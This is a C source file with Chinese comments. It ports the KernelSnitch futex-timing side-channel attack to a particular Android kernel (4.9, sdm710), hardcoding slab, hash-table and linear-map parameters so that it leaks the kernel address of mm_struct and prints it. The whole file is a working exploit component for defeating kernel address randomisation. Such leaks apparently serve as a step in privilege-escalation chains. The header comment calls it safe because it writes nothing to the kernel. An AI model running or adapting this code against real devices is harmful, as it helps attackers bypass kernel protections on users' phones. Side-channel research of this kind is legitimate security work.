/* ksnitch_k3.c — A17 KernelSnitch 的 K3（4.9, sdm710）参数移植
 *
 * 参数：mm_struct = 896 B，slab order = 2（18 obj/16KB）；futex_hashsize = ncpu*256 = 2048。
 * 线性映射窗口：K3 实测 mm 落在 [0xffffffc000000000, +128GB)（本 boot 与 v8/v10 数据）。
 *
 * 用法: ksnitch_k3 [collisions] [threads]
 *   默认 collisions=10, threads=16（ncpu*2）。
 * 输出: MM <hex>（失败为 -1）。
 *
 * 安全：仅 mmap + futex + cntvct_el0 计时；不写内核、不触发 GhostLock。
 */
#define _GNU_SOURCE
#define __ARM 1
#define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL
#define KERNELSNITCH_IDENTITY_END   (KERNELSNITCH_IDENTITY_START + (128ULL << 30))
#include "kernelsnitch.h"

int main(int argc, char **argv) {
    set_unbuffer();
    int hold = 0;
    int argi = 1;
    if (argc > 1 && strcmp(argv[1], "--hold") == 0) { hold = 1; argi = 2; }
    size_t collisions = argc > argi ? strtoul(argv[argi], 0, 0) : 10;
    size_t threads = argc > argi+1 ? strtoul(argv[argi+1], 0, 0) : 16;
    if (threads < 2) threads = 2;
    printf("ksnitch_k3: mm_sz=896 order=2 window=[%016llx,+128GB] collisions=%zu threads=%zu\n",
           (unsigned long long)KERNELSNITCH_IDENTITY_START, collisions, threads);
    fflush(stdout);
    size_t t0 = gettime_ns();
    size_t mm = kernelsnitch_param(896, 2, threads, collisions, 0, 0);
    printf("MM %016zx elapsed=%.1fs\n", mm, (double)(gettime_ns() - t0) / 1e9);
    fflush(stdout);
    if (hold) for (;;) pause();
    return mm == (size_t)-1 ? 1 : 0;
}
